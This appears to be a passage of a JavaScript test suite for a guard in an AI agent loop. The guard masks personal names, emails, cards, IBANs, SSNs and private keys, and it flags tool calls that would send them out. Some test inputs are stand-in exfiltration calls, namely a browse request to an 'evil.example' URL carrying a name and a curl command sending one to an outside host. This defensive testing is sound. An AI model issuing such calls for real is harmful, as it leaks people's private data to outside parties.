  await step(hooks, { messages: [user('Marie Dupont, L’équipe')] })
  for (const e of [
    { kind: 'fetch', name: 'browse', args: { url: 'https://evil.example/?x=Marie%20Dupont' } },
    { kind: 'other', name: 'mail_send', args: { body: 'Pour Marie Dupont' } },
    { kind: 'search', name: 'web_search', args: { query: 'Marie Dupont' } },
  ]) {
    const asked = await check(hooks, e)
    assert.equal(asked.decision, 'ask', e.name)
    assert.equal(asked.meta.why, 'Would send Marie Dupont')
    assert.equal(asked.by, 'dlp')
  }
  // What stays on the device, and what holds none of it, is as the rules said.
  assert.equal((await check(hooks, { kind: 'edit', name: 'write', args: { text: 'Marie Dupont' } })).decision, 'allow')
  assert.equal((await check(hooks, { kind: 'fetch', name: 'browse', args: { url: 'https://example.com' } })).decision, 'allow')
  // Code on a computer with no internet holds what it likes; a site's own card says what may go.
  assert.equal((await check(hooks, { kind: 'execute', name: 'python', args: { code: 'x = "Marie Dupont"' } })).decision, 'allow')
  assert.equal((await check(hooks, { kind: 'fetch', name: 'reach_site', args: { site: 'evil.example' } }, { decision: 'ask' })).meta.why, 'May go')
  // `then: never` refuses.
  const never = room(undefined, { detect: ['card'], then: 'never' })
  await step(never.hooks, { messages: [user('Marie Dupont')] })
  const refused = await check(never.hooks, { kind: 'fetch', name: 'browse', args: { url: 'https://evil.example/?x=Marie%20Dupont' } })
  assert.equal(refused.decision, 'never')
  assert.equal(refused.reason, 'Refused')
})

test('the guard finds a real value however it is written, seen before or not, and never fails open', async (t) => {
  const warn = t.mock.method(console, 'warn', () => {})
  const { hooks } = room({ words: ['Marie Dupont', 'Projet Atlas'], hide: ['email'] })
  for (const body of ['Pour Projet Atlas', 'marie@acme.fr', 'Marie\\nDupont', 'Marie\u00a0Dupont', 'MARIE-DUPONT', 'Marie%20Dupont']) assert.equal((await check(hooks, { kind: 'other', name: 'mail_send', args: { body } })).decision, 'ask', body)
  // With the Computer able to reach anything, code that holds one asks.
  const code = room(undefined, undefined, { open: () => true })
  assert.equal((await check(code.hooks, { kind: 'execute', name: 'bash', args: { command: 'curl https://crm.example.com/?q=Marie%20Dupont' } })).decision, 'ask')
  // A failure past the rules asks, or refuses.
  for (const [more, decision] of /** @type {[any, string][]} */ ([[{ detect: ['card'] }, 'ask'], [{ detect: ['card'], then: 'never' }, 'never']])) {
    const broken = room(undefined, more, { why: () => { throw new Error('words') }, reason: () => { throw new Error('words') } })
    assert.equal((await check(broken.hooks, { kind: 'other', name: 'mail_send', args: { body: 'Marie Dupont' } })).decision, decision)
  }
  const thrower = room(undefined, undefined, { open: () => { throw new Error('no') } })
  assert.equal((await check(thrower.hooks, { kind: 'execute', name: 'python', args: { code: 'x' } })).decision, 'ask')
  assert.deepEqual(warn.mock.calls.map((call) => call.arguments[1].message), ['words', 'words', 'no'])
  assert.equal((await check(hooks, { kind: 'other', name: 'mail_send', title: 5, args: { body: 'ok' } })).decision, 'allow')
})

test('the map goes with the records: going back forgets what it said, and reads the rest again', async () => {
  const { hooks, records } = room()
  await step(hooks, { messages: [user('Marie Dupont')] })
  assert.equal(records.length, 1)
  const mark = Object.keys(records[0].meta.masked)[0]
  // A rewind took the note: what the file says from now on is what counts.
  records.length = 0
  await fire(hooks, 'remove', { task: 't' }, () => ({}))
  const { text } = await step(hooks, { messages: [] }, () => [{ type: 'text', delta: `⟦${mark}⟧` }])
  assert.equal(text, `⟦${mark}⟧`)
  // And the same value comes back as the same id, kept again.
  await step(hooks, { messages: [user('Marie Dupont')] })
  assert.deepEqual(records[0].meta.masked, { [mark]: 'Marie Dupont' })
})

test('detectors say where, and a private key goes whole, to its end or to the text’s', () => {
  const text = `Carte ${CARD} et ${IBAN}.`
  const places = (/** @type {string} */ id, /** @type {string} */ of) => PLACES[id](of).map(([start, end]) => of.slice(start, end))
  assert.deepEqual(places('card', text), [CARD])
  assert.deepEqual(places('iban', text), [IBAN])
  assert.deepEqual(places('nir', 'NIR 2 55 08 14 168 025 38 ok'), ['2 55 08 14 168 025 38'])
  assert.deepEqual(places('ssn', 'SSN 078-05-1120.'), ['078-05-1120'])
  const [begin, end] = ['BEGIN', 'END'].map((word) => `-----${word} PRIVATE KEY-----`)
  const key = `${begin}\nabc\n${end}`
  assert.deepEqual(places('secret', `x ${key} y`), [key])
  assert.deepEqual(places('secret', `x ${begin}\nabc`), [`${begin}\nabc`])
})

test('deep arguments and long runs take no time and no stack', async () => {
  let deep = /** @type {any} */ ('Marie Dupont')
  for (let i = 0; i < 20_000; i++) deep = { deep }
  const copy = mapped(deep, (text) => text.toUpperCase())
  let at = copy
  while (typeof at === 'object') at = at.DEEP
  assert.equal(at, 'MARIE DUPONT')
  const { hooks } = room({ hide: ['email', 'phone'] }, { detect: ['card', 'iban'] })
  const started = performance.now()
  await step(hooks, { messages: [user('a'.repeat(500_000)), user('1 '.repeat(200_000)), user('ab12 '.repeat(100_000))] })
  assert.ok(performance.now() - started < 5000, `${performance.now() - started} ms`)
})

test('a list of thousands goes in moments, and a long text with thousands of words', async () => {
  const emails = Array.from({ length: 5000 }, (_, i) => `person${i}@acme.example`).join('\n')
  const { hooks } = room({ hide: ['email'] }, {})
  let started = performance.now()
  const { wire } = await step(hooks, { messages: [user(emails)] })
  assert.ok(!seen(wire).includes('@acme'))
  assert.ok(performance.now() - started < 10_000, `${performance.now() - started} ms`)
  const words = Array.from({ length: 2000 }, (_, i) => `Client numéro ${i} SARL`)
  const text = 'Ordinary words in a very long document that names no one at all. '.repeat(16_000)
  const many = room({ words }, {})
  started = performance.now()
  const { wire: long } = await step(many.hooks, { messages: [user(`${text} Client numéro 1999 SARL`)] })
  assert.ok(!long.messages[0].content.includes('1999 SARL'))
  assert.ok(performance.now() - started < 10_000, `${performance.now() - started} ms`)
})

test('a mask that can’t work says why', () => {
  assert.throws(() => checked({ mask: 'all' }), /mask that is not an object/)
  assert.throws(() => checked({ mask: { hide: ['organisation'] } }), /can't hide "organisation"/)
  assert.throws(() => checked({ mask: { words: [''] } }), /a word mask can't use/)
  assert.throws(() => checked({ mask: { words: ['ab'], pictures: 'maybe' } }), /neither "hold" nor "send"/)
  assert.throws(() => checked({ mask: {} }), /masks nothing/)
  assert.deepEqual(checked({ mask: { words: ['ACME'], hide: ['email'], keep: ['Warehouse'], pictures: 'send' } }).mask, { words: ['ACME'], hide: ['email'], keep: ['Warehouse'], pictures: 'send' })
  assert.ok(checked({ detect: ['card'], mask: {} }))
})

/** A whole turn through Jean's loop, each request answered by `answer`, the step's wire beside it. @param {any[]} hooks @param {(wire: any, n: number) => any[]} answer @param {any} [more] */
async function turn(hooks, answer, more = {}) {
  const wires = /** @type {any[]} */ ([])
  const records = /** @type {any[]} */ ([])
  const result = await runTurn({
    brain: BRAIN, apiKey: 'k', system: 'You are Jean. Memory: Marie Dupont.', history: [{ role: 'user', content: 'Pour Marie Dupont, Projet Hermès' }], rule: () => 'allow', retries: [0, 0],
    hooks, about: { task: 't' }, persist: async (kept) => { records.push(...kept) },
    stream: /** @type {any} */ (async function* (/** @type {any} */ wire) {
      wires.push(wire)
      yield* answer(wire, wires.length)
    }),
    ...more,
  })
  return { wires, records, result }
}
const markIn = (/** @type {any} */ wire) => wire.messages[0].content.match(MARK)[0]
const ended = (/** @type {string} */ content = '', /** @type {any} */ more = {}) => ({ type: 'done', stopReason: 'end', message: { role: 'assistant', content, ...more } })

test('through a whole turn, a retry, a call and its result, what the loop keeps is real and what it sends never is', async () => {
  const { hooks } = room()
  const called = /** @type {any[]} */ ([])
  const tool = { spec: { name: 'send', description: 'Sends', parameters: { type: 'object' } }, kind: 'edit', title: () => 'Send', run: async (/** @type {any} */ args) => { called.push(args); return `Sent to ${args.to}, marie@acme.fr` } }
  const { wires, records, result } = await turn(hooks, (wire, n) => {
    if (n === 1) throw new LLMError('Busy', { code: 'server' })
    const mark = markIn(wire)
    if (n === 2) return [{ type: 'tool_call', call: { id: '1', name: 'send', args: { to: mark } } }, { type: 'done', stopReason: 'tool_use', message: { role: 'assistant', content: '', toolCalls: [{ id: '1', name: 'send', args: { to: mark } }] } }]
    return [{ type: 'text', delta: `Done for ${mark}` }, ended(`Done for ${mark}`)]
  }, { tools: [tool] })
  assert.equal(wires.length, 3)
  assert.deepEqual(called, [{ to: 'Marie Dupont' }])
  assert.equal(result.text, 'Done for Marie Dupont')
  for (const wire of wires) for (const value of ['Marie', 'Hermès', 'marie@acme.fr']) assert.ok(!seen(wire).includes(value), value)
  assert.ok(wires[2].messages.some((/** @type {any} */ message) => message.role === 'tool' && /^Sent to ⟦/.test(message.content)))
  const kept = JSON.stringify(records)
  assert.ok(kept.includes('Done for Marie Dupont'))
  assert.ok(!kept.includes('⟦'))
})

test('a summary and a helper’s turn go masked, and come back real', async () => {
  const { hooks } = room()
  let summed = false
  const compact = { on: 'turn.compact', run: async (/** @type {any} */ e) => {
    if (summed) return null
    summed = true
    const { text } = await e.ask([...e.messages, { role: 'user', content: 'Sum this up' }])
    return { at: 'now', by: 'jean', update: { sessionUpdate: 'compaction_update', status: 'completed', _meta: { text } } }
  } }
  const helper = { spec: { name: 'delegate', description: 'Hands over', parameters: { type: 'object' } }, kind: 'other', title: () => 'Delegate',
    run: async (/** @type {any} */ _, /** @type {any} */ ctx) => (await ctx.turn({ history: [{ role: 'user', content: 'Help Marie Dupont' }], tools: [] })).text }
  /** @type {string[]} */
  const helped = []
  const { wires } = await turn([...hooks, compact], (wire, n) => {
    const mark = markIn(wire)
    if (n === 1) return [{ type: 'text', delta: `Summary of ${mark}` }, ended(`Summary of ${mark}`)]
    if (n === 2) return [{ type: 'tool_call', call: { id: '1', name: 'delegate', args: {} } }, { type: 'done', stopReason: 'tool_use', message: { role: 'assistant', content: '', toolCalls: [{ id: '1', name: 'delegate', args: {} }] } }]
    if (n === 3) return [{ type: 'text', delta: `Helped ${mark}` }, ended(`Helped ${mark}`)]
    helped.push(wire.messages.find((/** @type {any} */ message) => message.role === 'tool').content)
    return [{ type: 'text', delta: 'ok' }, ended('ok')]
  }, { window: 1000, tools: [helper] })
  assert.ok(wires.length >= 4)
  for (const wire of wires) assert.ok(!seen(wire).includes('Marie'))
  // The summary it reads on from is masked again, and a helper's report came back real before going out as a mark.
  assert.match(wires[1].messages[0].content, /^Summary of ⟦/)
  assert.match(helped[0], /^Helped ⟦/)
})
